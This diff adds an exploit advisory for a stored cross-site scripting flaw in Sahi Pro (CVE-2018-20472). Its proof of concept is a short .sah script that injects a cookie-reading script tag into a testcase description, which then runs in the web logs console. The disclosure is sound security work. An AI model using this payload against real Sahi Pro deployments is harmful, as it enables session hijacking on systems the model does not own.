@@ -1,0 +1,32 @@
+﻿# Exploit Title: Sahi pro ( <= 8.x ) Stored XSS
+# Date: 17-06-2019
+# Exploit Author: Goutham Madhwaraj ( https://barriersec.com )
+# Vendor Homepage: https://sahipro.com/
+# Software Link: https://sahipro.com/downloads-archive/
+# Version: 7.x , <= 8.x
+# Tested on: Windows 10
+# CVE : CVE-2018-20472
+# POC-URL : https://barriersec.com/2019/06/cve-2018-20472-sahi-pro/
+
+DESCRIPTION :
+
+An issue was discovered in Tyto Sahi Pro through 7.x.x and 8.0.0. The logs web interface is vulnerable to stored XSS. Description parameter of Testcase API can be used to exploit the stored XSS.
+
+
+POC :
+
+step 1 :
+
+ create a sahi test automation script with the following content and save the file with ".sah" extension ( example : poc.sah) :
+
+            var $tc1 = _testcase(“TC-1″,”<script>alert(document.cookie)</script>”).start();
+
+           _log(“testing stored XSS injection”);
+
+            $tc1.end();
+
+Step 2 :
+
+Execute the created script ( poc.sah ) using sahi GUI controller .
+
+Step 3 : navigate to the web logs console ( http://<ip>:<port>/logs ) using the browser for the executed script. XSS is triggered .
